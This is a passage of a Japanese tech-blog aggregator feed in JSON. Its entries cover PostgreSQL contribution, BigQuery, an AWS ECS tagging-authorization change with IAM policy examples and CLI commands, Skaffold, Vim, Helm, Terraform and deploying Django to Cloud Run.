PostgreSQLアンカンファレンス@東京が開催されました。PostgreSQLアンカンファレンスは日本PostgreSQLユーザー会が主催するイベントでPostgreSQLユーザーはもちろん、PostgreSQLのコントリンビューターやコミッターも参加しているイベントです。その中でPostgreSQL メジャーコントリビューターであり、コミッターでもある@masahiko_sawadaさんが、PGConn 2024でMAKING POSTGRESQL HACKING MORE INCLUSIVEというセッションでPostgreSQLコミュニティーがどうすればより初心者にオープンになれるか？ という内容でディスカッションするそうです。そこに向けてアイデアはあるか？ 困ってることはないか？ という相談？ をされていました。経験豊富な方々は実践的な案を出していましたが、私はPostgreSQLにコードコントリビュートしたいけど何からすればいいのか分らないという状態だったのでこの機会に相談してみました。自分のレベル感Cはすこし読める。すこし書けるPostgreSQLのソースコードはsimple_query_execの関数をひととおり読んで、なんとなくどこで何しているか分かるPostgreSQLのメーリングリストはとりあえず入った何が分からなかったのか？そもそもPostgreSQLはメーリングリストとパッチの文化なのでGitHub/Labなどになれた身からするとよく分からないです。またGitHubで管理されているOSSでは良くあるgood first issueのようなものも存在しないため、新規参入者には難しいと感じていました。なにからすればいいのか？PGUnconfでは以下のようなアドバイスを受けました。チュートリアルをなぞってドキュメント通りに動かないものを修正する初心者向けコンテンツへの追記は初心者にしか出来ないので、是非おねがいしたいとのことでした既存のパッチで放置されているもの(Headでビルドできないようなもの)をアップデートするメーリングリストのディスカッションを眺めてネタを探す新規機能を試してバグをさがし、修正するCommitFestに参加するまとめ1のネタを探してみつつ、PostgreSQL17のリリースが近いので4に取りくんでみようと思います。","isoDate":"2024-03-31T14:30:29.000Z","dateMiliSeconds":1711895429000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"BigQuery の Object テーブルと Gemini-pro-vision リモートモデルを使って pdf を要約してみる","link":"https://zenn.dev/satohjohn/articles/0cc45efca800e3","contentSnippet":"概要pdf などの非構造化データを GCS に配置した際に BQ で分析するってどうすんねんというところをやってみる流れとしては以下を実施するpdf などを gcs に配置するBigQuery Connection の作成する必要な権限付与を行うBQ で Object テーブルを作成するBQ でリモートモデルを作成するObject テーブルを使って pdf の要約をする 必要なことBigQuery Connection API の有効化 手順 pdf などを GCS に配置するここは何も考えないで GCS に pdf を配置する例えば、今回...","isoDate":"2024-03-30T17:44:21.000Z","dateMiliSeconds":1711820661000,"authorName":"SatohJohn","authorId":"SatohJohn"},{"title":"生成AIアプリケーションにおけるRAGとデータベースの役割","link":"https://speakerdeck.com/shukob/sheng-cheng-aiahurikesiyonniokeruragtotetahesunoyi-ge","contentSnippet":"https://3-shake.connpass.com/event/311868/\\r3-SHAKE SRETTにて、生成AIのデータベースやストレージに関連した部分を発表。","isoDate":"2024-03-29T04:00:00.000Z","dateMiliSeconds":1711684800000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"オシャレな図を書くために意識していること","link":"https://speakerdeck.com/kojake_300/osiyarenatu-woshu-kutameniyi-shi-siteirukoto","contentSnippet":"","isoDate":"2024-03-29T04:00:00.000Z","dateMiliSeconds":1711684800000,"authorName":"Yuki Iwasaki","authorId":"kojake_300"},{"title":"2024-03-29 SRETT9 Cloud SQLの可用性について","link":"https://speakerdeck.com/masasuzu/2024-03-29-srett9-cloudsqlnoke-yong-xing","contentSnippet":"","isoDate":"2024-03-29T04:00:00.000Z","dateMiliSeconds":1711684800000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"社内ChatBot (h1-slack-bot)にClaude\xa03を追加した話(+α)","link":"https://sreake.com/blog/chatgpt-slack-integration-claude-3/","contentSnippet":"1. はじめに はじめまして、Sreake事業部インターン生の井上です。私はSreake事業部にてSRE技術の調査と研究を行う目的で2023年3月6日から長期インターン生として参加しています。 この記事では、Anthro […]The post 社内ChatBot (h1-slack-bot)にClaude\xa03を追加した話(+α) first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2024-03-29T02:50:00.000Z","dateMiliSeconds":1711680600000,"authorName":"Sreake","authorId":"Sreake"},{"title":"ビットコイン・ブロックチェーン入門","link":"https://speakerdeck.com/shukob/hitutokoinhurotukutienru-men","contentSnippet":"初学者の方向けにビットコイン・ブロックチェーン技術の全体像をお話ししました。","isoDate":"2024-03-22T04:00:00.000Z","dateMiliSeconds":1711080000000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"新人SREが0から始めるGKE上でのArgoCDによるWordPressデプロイ","link":"https://sreake.com/blog/deploy-wordpress-with-argocd-on-gke/","contentSnippet":"はじめに はじめまして。Sreake事業部インターン生の高島です。2023年10月から長期インターン生としてKubernetes関連技術の習得とSRE技術の調査・検証を行っています。私は、情報系の大学院生で、普段は数値解 […]The post 新人SREが0から始めるGKE上でのArgoCDによるWordPressデプロイ first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2024-03-21T23:34:40.000Z","dateMiliSeconds":1711064080000,"authorName":"Sreake","authorId":"Sreake"},{"title":"ECSのタグ付け認可とアカウント単位のオプトアウトの廃止","link":"https://blog.masasuzu.net/entry/2024/03/20/121151","contentSnippet":"ECSのタグ付け認可とはアカウント単位のオプトアウトの廃止確認影響がある例対応まとめ関連リソースECSのタグ付け認可とはECS関連のリソース作成時にリソースタグを付けることができます。その際 ecs:tagResource の権限が必要となります。なお、リソースタグを設定しないECSリソース作成の際は権限不要です。この権限の有無のチェックをタグ付け認可と言います。具体的にECSリソースの作成のアクションは以下の通りです。CreateCapacityProviderCreateClusterCreateServiceCreateTaskSetRegisterContainerInstanceRegisterTaskDefinitionRunTaskStartTaskタグ付け認可の仕組みは2023年4月18日に導入されました。しかしながら従来からECSリソースを作成する際にタグ付けしていたAWSアカウントに関しては影響があるため、アカウントレベルでタグ付け認可の機能を無効(オプトアウト)することができました。つまりアカウントレベルで無効にしていれば ecs:tagResource の権限がなくてもタグ付けをすることが可能でした。しかしながらアカウント単位のオプトアウト設定は2024年3月9日に廃止されます。アカウント単位のオプトアウトの廃止タグ付け認可におけるタイムラインは以下のとおりです2023年4月18日 タグ付け認可の導入とアカウント単位での有効化設定の導入2024年2月9日- 2月28日 新規アカウントおよび影響を受けないアカウントに関してデフォルトでタグ付け認可の有効化が行われる2024年2月29日 アカウント単位で有効にしている場合、無効に変更できなくなる2024年3月29日 すべてのアカウントでタグ付け認可が有効になり、アカウント単位での設定が不可能になる現時点(2024/03/20)であまり時間がありません。現在タグ付け認可に影響あるAWSアカウントに関しては、Personal Health Dashboadに以下のような通知が来ているはずです。▼ElasticContainerService security notification (クリックで展開)▼English follows Japanese | 英語のメッセージは日本語の後にございますお客様のアカウントにて過去 1 年以内に ecs:TagResource の許可無しに ECS リソースの作成時にタグを付けていることが判明したため、ご連絡差し上げます。Amazon ECS は、2023 年 4 月 18 日にリソース作成のタグ付け認証を導入しました [1]。新規および既存のお客様は、ECS Console または API の ECS アカウント設定ページを使用して、この新機能の使用をオプトインする必要があります。このセキュリティ制御により、ECS リソースの作成時にタグをつけることをユーザーに拒否または許可できます。2024 年 3 月 29 日以降もお客様の IAM プリンシパルが新しく作成された ECS リソースに引き続きタグを適用できるように、IAM ポリシーを更新して ecs:TagResource アクションを明示的に許可することを強くお勧めします。2024 年 2 月 9 日以降、AWS コンソール の ECS アカウント設定ページにて tagResourceAuthorization アカウント設定を明示的に off に設定していないすべてのお客様のアカウントは、自動的にこの設定にオプトインされました。お客様の AWS アカウントは一時的に許可リストに載せているため、2024 年 3 月 29 日まではタグリソース認証の off の動作が継続されます。2024 年 3 月 8 日、現在オプトインしているアカウントが tagResourceAuthorization をオプトアウトする機能を削除し、タグをサポートするすべての ECS リソースの作成に際して ecs:TagResource IAM 権限の使用を強制するようにしました。最終的に 2024 年 3 月 29 日をもってお客様のアカウントを許可リストから削除し、tagResourceAuthorization を有効化します。呼び出し元のプリンシパルの IAM ポリシーに ecs:TagResource アクションを含めずにタグをつけて ECS リソースを作成しようとすると、「AccessDenied」メッセージが表示されます。この変更は CreateCapacityProvider, CreateCluster, CreateService, CreateTaskSet, RegisterContainerInstance, RunTask, StartTask, および RegisterTaskDefinition の API に影響を及ぼします。ecs:TagResource を使用しない拒否レスポンスの例以下は、ecs:CreateCluster アクションを付与している IAM ポリシーの一部です。ecs:TagResource アクションは含まれていません。tagResourceAuthorization アカウント設定がオンの場合、リクエスト例では以下の AccessDenied 例外が返されます。# IAM ポリシー“Statement”: [{“Sid”: “AllowCreateCluster”,“Effect”: “Allow”,“Action”: [“ecs:CreateCluster”],“Resource”: “*”}]# クラスター作成のリクエストaws ecs create-cluster --cluster-name MyCluster --tags key=key1,value=value1# タグ付けの拒否されたレスポンスAn error occurred (AccessDeniedException) when calling the CreateCluster operation:User: is not authorized to perform: ecs:TagResource on resource: cluster/MyCluster because no identity-based policy allows the ecs:TagResource action必要なアクション:IAM プリンシパルが 2024 年 3 月 29 日以降も新しく作成された ECS リソースに引き続きタグを適用できるように、IAM ポリシーに次のステートメントを追加することを強くお勧めします。すべての ECS リソースの作成時にタグ付けを許可以下の説明に従って ecs:TagResource アクションを追加すると、ECS リソースの作成中にタグ付けが可能になります [2]。“Statement”: [{“Sid”: “AllowTagging”,“Effect”: “Allow”,“Action”: [“ecs:TagResource”],“Resource”: “*”}]単一の ECS リソースタイプ (ECS クラスタ) の作成時にタグ付けを許可条件ステートメント ecs:CreateAction を使用すると、タグ付けを特定の ECS API に制限できます。以下の例では、ECS CreateCluster API でのみタグ付けへのアクセスを許可します。タグ付きの ECS RunTask API へのリクエストは、拒否判定になります [2]。“Statement”: [{“Sid”: “AllowClusterTagging”,“Effect”: “Allow”,“Action”: [“ecs:TagResource”],“Resource”: “*”,“Condition”: {“StringEquals”: {“ecs:CreateAction” : “CreateCluster”}}}]タイムライン:2024 年 2 月 9 日（完了）- タグ付け認証はデフォルトで on になっています。これには、ホワイトリストに登録されているアカウントは含まれません。tagResourceAuthorization アカウント設定の on/off を切り替えることも可能であり、ポリシーへの準拠をテストいただけます。2024 年 3 月 8 日 - タグ付け認証を on にすると、off にすることはできなくなります。この日まではアカウント設定を切り替えることができますので、その間に IAM ポリシーをテストすることをお勧めします。2024 年 3 月 29 日 - すべての AWS アカウントでタグ付け認証が有効になります。アカウントレベルの設定は使用されなくなり、AWS コンソールの ECS アカウント設定ページから削除されます。ご質問やご不明点等ございましたら、AWS サポート [3] までお問い合わせください。[1] https://docs.aws.amazon.com/AmazonECS/latest/developerguide/ecs-account-settings.html#tag-resources-setting[2] https://docs.aws.amazon.com/AmazonECS/latest/developerguide/supported-iam-actions-tagging.html[3] https://aws.amazon.com/support---We are contacting you because we identified that your account has tagged ECS resources upon creation, within the past year, without the ecs:TagResource permission. Amazon ECS introduced tagging authorization for resource creation on April 18, 2023 [1]. New and existing customers must opt-in to use this new feature by using the ECS Account Settings page in the ECS Console or API. This security control allows users to deny or allow tagging ECS resources when they are created. We strongly recommend you update your IAM policies to explicitly allow the ecs:TagResource action so that your IAM principals continue applying tags to newly created ECS resources on or after March 29, 2024.From February 9, 2024, all customer accounts which have not explicitly set the tagResourceAuthorization account setting to “off” in the ECS Account Settings page in the AWS Console were automatically opted into the setting. We have temporarily allow-listed your AWS account so you will continue to have the “off” behavior for tagResourceAuthorization until March 29, 2024.On March 8, 2024, we removed the ability for currently opted-in accounts to opt-out of tagging authorization and enforced the creation of all ECS resources that support tags to use the ecs:TagResource IAM permission.Finally on March 29, 2024, we will remove your account from the allow-list and activate tagResourceAuthorization. You will experience an \\"AccessDenied\\" message if you attempt to create tagged ECS resources without including the ecs:TagResource action in the IAM policy of the calling principal. This change will affect the following APIs: CreateCapacityProvider, CreateCluster, CreateService, CreateTaskSet, RegisterContainerInstance, RunTask, StartTask, and RegisterTaskDefinition.Example Deny Response without ecs:TagResourceThe following is part of an IAM policy that is granting the ecs:CreateCluster Action. It does not include the ecs:TagResource Action. When tagResourceAuthorization Account setting is on, the example request would return the AccessDeniedException below.# IAM Policy“Statement”: [{“Sid”: “AllowCreateCluster”,“Effect”: “Allow”,“Action”: [“ecs:CreateCluster”],“Resource”: “*”}]# Create Cluster Requestaws ecs create-cluster --cluster-name MyCluster --tags key=key1,value=value1# Tagging Denied ResponseAn error occurred (AccessDeniedException) when calling the CreateCluster operation:User: is not authorized to perform: ecs:TagResource on resource: cluster/MyCluster because no identity-based policy allows the ecs:TagResource actionRequired Action:To ensure your IAM principals continue applying tags to newly created ECS resources on or after March 29, 2024, we strongly recommend adding the following statement(s) to your IAM policies:Allow Tagging during creation for all ECS ResourcesAdding the ecs:TagResource Action as described below would Allow tagging during ECS resource creation [2].“Statement”: [{“Sid”: “AllowTagging”,“Effect”: “Allow”,“Action”: [“ecs:TagResource”],“Resource”: “*”}]Allow Tagging during creation for single ECS Resource Type (ECS Cluster)Using the Conditional statement ecs:CreateAction allow you to limit the tagging to a specific ECS API. The example below grants access to tagging only on the ECS create-cluster API. A request to the ECS API run-task with tags would result in a Deny decision [2].“Statement”: [{“Sid”: “AllowClusterTagging”,“Effect”: “Allow”,“Action”: [“ecs:TagResource”],“Resource”: “*”,“Condition”: {“StringEquals”: {“ecs:CreateAction” : “CreateCluster”}}}]Timeline:February 9, 2024 (Completed) - Tagging Authorization is “on” by default. This excludes your account which is allowlisted. The tagResourceAuthorization account setting can be turned on/off to help test your policy compliance.March 8, 2024 - Tagging Authorization can no longer be turned “off” once it is turned “on”. It is recommended that you test your IAM policies before this date while you are able to toggle the account setting.March 29, 2024 - Tagging Authorization will be turned on for all AWS accounts. The account level setting will no longer be used and will be removed from the ECS Account Settings page in the AWS Console.If you have any questions, please contact AWS Support [3].[1] https://docs.aws.amazon.com/AmazonECS/latest/developerguide/ecs-account-settings.html#tag-resources-setting[2] https://docs.aws.amazon.com/AmazonECS/latest/developerguide/supported-iam-actions-tagging.html[3] https://aws.amazon.com/support通知が来ているアカウントは29日までに対応する必要があります。確認aws ecs list-account-settings --effective-settings --name tagResourceAuthorization を実行すると以下のような表示になると思います。ここがonであれば、すでにアカウント単位で有効になってるので影響がありません。(ただし、タグ付きのリソースを新規作成する際には権限が足りないとエラーになる可能性はあります)ここがoffになっている場合、タグ付け認可が無効になってるので3月29日以降影響を受ける可能性があります。% aws ecs list-account-settings --effective-settings --name tagResourceAuthorization{    \\"settings\\": [        {            \\"name\\": \\"tagResourceAuthorization\\",            \\"value\\": \\"on\\",            \\"principalArn\\": \\"arn:aws:iam::xxxxxxxxxxxx:root\\"        }    ]}影響がある例ユースケースにもよりますが、タグ付け認可に関連する操作は以下のようなものが考えられるかと思いますインフラ担当者によるECSリソース構築開発担当者(またはCI/CD)によるECSサービスのデプロイ前者に関しては、PowerUser相当の強い権限を付与されていることが多くここが問題になることはほとんどど無いかとは思います。後者の特にCI/CDによるデプロイに問題となることがありえます。一般的に非人間ユーザで目的が明確であれば、最小権限の原則に則り、 ecs:TagResource が付与されていない可能性があります。トライアンドエラーで権限を付与した場合、過去にうまく動いたためそのままの権限で使い続けている可能性もあります。その場合影響がある可能性あります。デプロイ時のタスク定義登録の際、タスク定義内に従来なかったtagsの記述を新規追加した際にResgisterTaskDefinitionでエラーになるという事例を私は経験しました。タスク定義にtagsがないときはタグ付け認可は実行されないのでそのまま成功していたため、ecs:TagResource が必要なことに気づいていませんでした。エラーとしては以下のような記述になるので、タグ付け認可の機能の存在を知っていて冷静に読み解けば、ecs:TagResource が足りていないことに気づけると思います。An error occurred (AccessDeniedException) when calling the RegisterTaskDefinition operation: User: arn:aws:sts::xxxx:assumed-role/deploy-github-actions/GitHubActions is not authorized to perform: ecs:TagResource on resource: arn:aws:ecs:ap-northeast-1:xxxx:task-definition/ecs-service because no identity-based policy allows the ecs:TagResource action対応まずECSサービスを利用しているIAM RoleとIAM Policyを洗い出します。その上でそれらが以下のアクションを許可している場合、ecs:TagResource を追加してあげます。CreateCapacityProviderCreateClusterCreateServiceCreateTaskSetRegisterContainerInstanceRegisterTaskDefinitionRunTaskStartTask私の場合は、ECSサービスデプロイ用のポリシーに以下のStatementを追加しました。それぞれ適切な記述を足していただけたらと思います。この場合タスク定義を登録する際にタグ付け認可を通すような許可を追加しています。        {            \\"Action\\": \\"ecs:TagResource\\",            \\"Condition\\": {                \\"StringEquals\\": {                    \\"ecs:CreateAction\\": \\"RegisterTaskDefinition\\"                }            },            \\"Effect\\": \\"Allow\\",            \\"Resource\\": \\"arn:aws:ecs:ap-northeast-1:xxxxxx:task-definition/yyyyyyyyyyyyyyy:*\\",            \\"Sid\\": \\"RegisterTaskDefinitionWithTag\\"        },まとめタグ付け認可について説明しました。タグ付け認可は2024年3月29日に強制的に全アカウントで有効になります。時間が少ないですが、影響受ける可能性があるかどうかチェックしてハマらないようにしましょう。また、これまでタグ付けしてなかったリソースにタグ付けする際にタグ付け認可に引っかかる可能性があります。デプロイやリソース作成の際にnot authorized to perform: ecs:TagResource と言われたらこの記事を思い出していただけたらと思います。それでは良いECSライフを!関連リソースアカウント設定による Amazon ECS 機能へのアクセス - Amazon Elastic Container Service タグ付け認可リソース作成時にタグ付けするための許可を付与する - Amazon Elastic Container Service","isoDate":"2024-03-20T03:11:51.000Z","dateMiliSeconds":1710904311000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"Skaffoldのスゴさを語る！","link":"https://zenn.dev/kojake_300/articles/11945f2047b22b","contentSnippet":"この記事は、2024/3/15に登壇したJagu\'e\'r クラウドネイティブ分科会　俺の考える最強のCI/CDのリマスターになります。 k8sアプリケーション開発の悩み突然ですが皆さん、k8sでアプリを動かす時にこんな悩み、イライラはありませんか？k8sで検証する時には必ず通る道だと思います。効率よく検証するにはどうしたものか、、Skaffoldはそんな悩みを解決してくれます\uD83D\uDE04 Skaffoldとは？ 概要Skaffold[1]は、コンテナベース及びKubernetesアプリケーションの継続的開発(Continuous Development = CD)を容易...","isoDate":"2024-03-18T11:24:43.000Z","dateMiliSeconds":1710761083000,"authorName":"Yuki Iwasaki","authorId":"kojake_300"},{"title":"Skaffoldを用いたGKEアプリケーションの CD（Continuous Development）","link":"https://speakerdeck.com/kojake_300/skaffoldwoyong-itagkeapurikesiyonno-cd-continuous-development","contentSnippet":"","isoDate":"2024-03-17T04:00:00.000Z","dateMiliSeconds":1710648000000,"authorName":"Yuki Iwasaki","authorId":"kojake_300"},{"title":"gin.vimで捗るgitのログ改竄 (instant fixup)","link":"https://blog.atusy.net/2024/03/15/instant-fixup-with-gin-vim/","contentSnippet":"Vim 駅伝の2024/3/15の記事です。Gitで整然とコミットを詰むのはそうそうたやすいものではありません。あのコミットでバグを仕込んでしまった、コミットメッセージを間違えていた、そんなミスはよくあることです。かと言って、整然とコミットするためにコミットを後回しにしては本末転倒です。うかつな操作で作業内容を失うかもしれませんし、少し前の作業内容に戻りたくなるかもしれません。また差分が大きくなるほど適切な粒度でのコミットが億劫になります。","isoDate":"2024-03-15T00:00:00.000Z","dateMiliSeconds":1710460800000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"Tagpr で tag trigger の workflow が実行されなくてハマった話","link":"https://blog.1q77.com/2024/03/tagpr/","contentSnippet":"最近 tagpr という便利ツールの存在を知って試していたのですが、使い方が悪くてハマったのでメモ。tagpr とは作者さまの記事を参照ください。リリース用のpull requestを自動作成し、マージされたら自動でタグを打つtagpr","isoDate":"2024-03-15T00:00:00.000Z","dateMiliSeconds":1710460800000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"Helm chart を GitHub Container Registry に host する","link":"https://blog.1q77.com/2024/03/helm-push-to-ghcr/","contentSnippet":"背景最近は書いたアプリを Kubernetes に deploy することも多い。その際に helm で簡単に deploy できるようになっていると便利ということで Helm chart を Git に入れておいても良いのだけれども、せっかくなら直接インストールできるようにしてしまいたい。そんな場合に使えるのが OCI Registry。","isoDate":"2024-03-14T15:13:39.000Z","dateMiliSeconds":1710429219000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"書を捨てよ、現場へ出よう","link":"https://speakerdeck.com/nwiizo/shu-woshe-teyo-xian-chang-hechu-you","contentSnippet":"書を捨てよ、現場へ出よう このSRE本がすごい！2024年 LT版というタイトルで登壇してきました。\\r\\rSREたちの廊下〜あなたの現場での悩み、あの本にヒントがあるかも〜\\rhttps://findy.connpass.com/event/311323/\\r\\r元ブログはこちら\\r\\rこのSRE本がすごい！2024年版\\rhttps://syu-m-5151.hatenablog.com/entry/2024/01/26/165255\\r\\r登壇ブログはこちら\\r\\r『読書とは、能力、知識ではなく 問いを獲得するための行為』みたいな内容で登壇しました。\\rhttps://syu-m-5151.hatenablog.com/entry/2024/03/13/164951","isoDate":"2024-03-12T04:00:00.000Z","dateMiliSeconds":1710216000000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"gyでVimからクリップボードにヤンクする","link":"https://blog.atusy.net/2024/03/11/vim-gy-as-gui-yank/","contentSnippet":"Vim 駅伝の2024/3/11の記事です。Vim/Neovimで文字列をクリップボードへヤンクする主な方法は大きく二通りあります。都度指定\\"*yや\\"+yといった具合にヤンクする時にクリップボードを使うよう、明示的にレジスタを指定する自動同期set clipboard+=unnamedplus（またはunnamed）しておき、レジスタを指定せずにヤンクした内容を自動的にクリップボードに同期する詳しくは以下の記事をご参照ください。","isoDate":"2024-03-11T00:00:00.000Z","dateMiliSeconds":1710115200000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"生成AI入門","link":"https://speakerdeck.com/shukob/sheng-cheng-airu-men","contentSnippet":"今話題の生成AIについて簡単に技術概要をお話ししたのち、LangChain、プロンプトエンジニアリング、RAG（Retrieval Augmented Generation）、Embedding、グラウンディングなどを実装の手法などを紹介しました。","isoDate":"2024-03-02T05:00:00.000Z","dateMiliSeconds":1709355600000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"ftExtra v0.6.2をリリースしました","link":"https://blog.atusy.net/2024/03/01/ftextra-v0-6-2/","contentSnippet":"ftExtra v0.6.2をリリースしました。flextableパッケージを使って表組みする時に、セル内のマークダウンを処理できる ftExtra::colformat_md() がウリです。data.frame( x = c(\\"**bold**\\", \\"*italic*\\"), y = c(\\"^superscript^\\", \\"~subscript~\\"), z = c(\\"***~ft~^Extra^** is*\\", \\"*Cool*\\"), stringsAsFactors = FALSE) |> flextable::flextable() |> ftExtra::colformat_md().cl-9f195392{}.cl-9f13596a{font-family:\'DejaVu Sans\';font-size:11pt;font-weight:normal;font-style:normal;text-decoration:none;color:rgba(0, 0, 0, 1.00);background-color:transparent;}.cl-9f135974{font-family:\'DejaVu Sans\';font-size:11pt;font-weight:bold;font-style:normal;text-decoration:none;color:rgba(0, 0, 0, 1.00);background-color:transparent;}.cl-9f13597e{font-family:\'DejaVu Sans\';font-size:6.6pt;font-weight:normal;font-style:normal;text-decoration:none;color:rgba(0, 0, 0, 1.00);background-color:transparent;position: relative;bottom:3.3pt;}.cl-9f13597f{font-family:\'DejaVu Sans\';font-size:6.6pt;font-weight:bold;font-style:italic;text-decoration:none;color:rgba(0, 0, 0, 1.00);background-color:transparent;position: relative;top:3.3pt;}.cl-9f135988{font-family:\'DejaVu Sans\';font-size:6.6pt;font-weight:bold;font-style:italic;text-decoration:none;color:rgba(0, 0, 0, 1.00);background-color:transparent;position: relative;bottom:3.3pt;}.cl-9f135989{font-family:\'DejaVu Sans\';font-size:11pt;font-weight:normal;font-style:italic;text-decoration:none;color:rgba(0, 0, 0, 1.00);background-color:transparent;}.cl-9f135992{font-family:\'DejaVu Sans\';font-size:6.6pt;font-weight:normal;font-style:normal;text-decoration:none;color:rgba(0, 0, 0, 1.00);background-color:transparent;position: relative;top:3.3pt;}.cl-9f168324{margin:0;text-align:left;border-bottom: 0 solid rgba(0, 0, 0, 1.00);border-top: 0 solid rgba(0, 0, 0, 1.00);border-left: 0 solid rgba(0, 0, 0, 1.00);border-right: 0 solid rgba(0, 0, 0, 1.00);padding-bottom:5pt;padding-top:5pt;padding-left:5pt;padding-right:5pt;line-height: 1;background-color:transparent;}.cl-9f1690b2{width:0.75in;background-color:transparent;vertical-align: middle;border-bottom: 1.5pt solid rgba(102, 102, 102, 1.00);border-top: 1.5pt solid rgba(102, 102, 102, 1.00);border-left: 0 solid rgba(0, 0, 0, 1.00);border-right: 0 solid rgba(0, 0, 0, 1.00);margin-bottom:0;margin-top:0;margin-left:0;margin-right:0;}.cl-9f1690bc{width:0.75in;background-color:transparent;vertical-align: middle;border-bottom: 0 solid rgba(0, 0, 0, 1.00);border-top: 0 solid rgba(0, 0, 0, 1.00);border-left: 0 solid rgba(0, 0, 0, 1.00);border-right: 0 solid rgba(0, 0, 0, 1.00);margin-bottom:0;margin-top:0;margin-left:0;margin-right:0;}.cl-9f1690bd{width:0.75in;background-color:transparent;vertical-align: middle;border-bottom: 1.5pt solid rgba(102, 102, 102, 1.00);border-top: 0 solid rgba(0, 0, 0, 1.00);border-left: 0 solid rgba(0, 0, 0, 1.00);border-right: 0 solid rgba(0, 0, 0, 1.00);margin-bottom:0;margin-top:0;margin-left:0;margin-right:0;}x","isoDate":"2024-03-01T00:00:00.000Z","dateMiliSeconds":1709251200000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"Google Cloud Managed Service for Prometheusでprismaメトリクスを可視化してみた","link":"https://speakerdeck.com/kojake_300/google-cloud-managed-service-for-prometheusteprismametorikusuwoke-shi-hua-sitemita","contentSnippet":"","isoDate":"2024-02-29T05:00:00.000Z","dateMiliSeconds":1709182800000,"authorName":"Yuki Iwasaki","authorId":"kojake_300"},{"title":"Reckoner の Scala プロジェクトにおける オブザーバビリティの取り組み / Observability Initiatives in Reckoner\'s Scala Project","link":"https://speakerdeck.com/nomadblacky/reckoner-no-scala-puroziekutoniokeru-obuzababiriteinoqu-rizu-mi","contentSnippet":"2024/02/27 Scalaわいわい勉強会 #2\\rhttps://scala-tokyo.connpass.com/event/307069/","isoDate":"2024-02-27T05:00:00.000Z","dateMiliSeconds":1709010000000,"authorName":"Takumi Kadowaki","authorId":"nomadblacky"},{"title":"Azure Container Apps Jobs を Self-hosted GitHub Actions Runner として使う","link":"https://blog.1q77.com/2024/02/container-apps-jobs-self-hosted-github-actions-runner/","contentSnippet":"GitHub Actions の Self-hosted Runner を安く用意する方法を探していたところ、Azure の Container Apps Jobs というのが便利に使えるらしいというのを見つけたので試してみる。チュートリアル:Azure Container Apps ジョブを使用してセルフホスト型 CI/CD ランナーとエージェントをデプロイするをなぞるだけです。","isoDate":"2024-02-23T10:05:41.000Z","dateMiliSeconds":1708682741000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"Terraform workspace使って思ったこと","link":"https://sreake.com/blog/terraform-workspace/","contentSnippet":"背景 そこまで大きな案件でもなく、 環境間の差分もあまりなさそうだったため 何より使ったことないから試してみようっていう好奇心 ある案件にて上記の理由から、Terraform workspaceを採用しました。 今回は、 […]The post Terraform workspace使って思ったこと first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2024-02-18T14:28:59.000Z","dateMiliSeconds":1708266539000,"authorName":"Sreake","authorId":"Sreake"},{"title":"アーキテクチャから学ぶKubernetesの全体像","link":"https://speakerdeck.com/bells17/akitekutiyakaraxue-hukubernetesnoquan-ti-xiang","contentSnippet":"Developers Summit（デブサミ）2024で登壇したセッションの資料です。\\r\\r- https://event.shoeisha.jp/devsumi/20240215\\r- https://event.shoeisha.jp/devsumi/20240215/session/4777\\r\\rセッション解説記事:\\rhttps://codezine.jp/article/detail/19131","isoDate":"2024-02-15T05:00:00.000Z","dateMiliSeconds":1707973200000,"authorName":"bells17","authorId":"bells17"},{"title":"個人開発でWebアプリの開発とデプロイの流れ","link":"https://kechigon.hatenablog.com/entry/2024/02/13/125853","contentSnippet":"個人でWebサービスを開発したいけど、どのような流れで作っていけばいいのかわからない方向けです。個人開発でWebアプリを開発、デプロイをしたのでその流れを共有したいと思います。作ったもの麻雀戦績管理アプリ名付けて「PungPals」。雀荘などのオフラインでの対戦結果を残し、個人成績やランキングを確認できます。pungpals-service-xstpolfd4q-an.a.run.app開発とデプロイの流れ1.要件定義、設計実装がスムーズに進むために、しっかりとしておきましょう。以前記事を書いたので、参考にしてください。kechigon.hatenablog.com2.技術選定今回作ったアプリケーションはDjangoで開発し、Cloud Runにデプロイしています。選定理由は、Django: 経験があるから。Cloud Run: Djangoアプリのデプロイ方法の公式ドキュメントがあった(後ほど説明します)、マネージドな部分とカスタムできる部分のバランスがちょうどよかったから。でした。以下これらの技術を使って、開発デプロイまでの流れを説明していきます。3.Djangoを使ってアプリケーションを作成Djangoにはチュートリアルがあり、はじめての Django アプリ作成、その 1 | Django ドキュメント | Djangoはじめての Django アプリ作成、その2 | Django ドキュメント | Djangoはじめての Django アプリ作成、その 3 | Django ドキュメント | Djangoはじめての Django アプリ作成、その 4 | Django ドキュメント | Djangoを読めば開発方法がわかると思います。環境構築をし、実装し、ローカルで動作確認をしながら開発していきます。4.Cloud run へのデプロイDjangoアプリのCloud runへのデプロイ方法は公式ドキュメントにまとめられているので、これを見ながら進めます。cloud.google.comDjangoアプリケーションを環境に合わせて設定した後コンテナ化し、Cloud Runに載せます。それに伴い、Cloud SQL(データベース)、Secret Manager(シークレット管理)、Cloud Storage(静的アセットの保存など)、Cloud Build(CI/CD)、Artifact Registry(コンテナレジストリ)の作成、設定も行います。ドキュメントではGCRを使っていますが、現在非推奨なので、Artifact Registryをコンテナレジストリとして使用します。cloud.google.comオプションですが、GCPへのリソースの作成はTerraformを利用すると、構成管理ができ便利です。作成するインフラの図以上のことを行った後のGitHubリポジトリPungPalsのコードは公開しているので、参考にしていただければと思います。github.comこれから今後は、運用面の課題解決や集客などを行っていく予定なので、ブログにしていくつもりです！","isoDate":"2024-02-13T03:58:53.000Z","dateMiliSeconds":1707796733000,"authorName":"Kurita 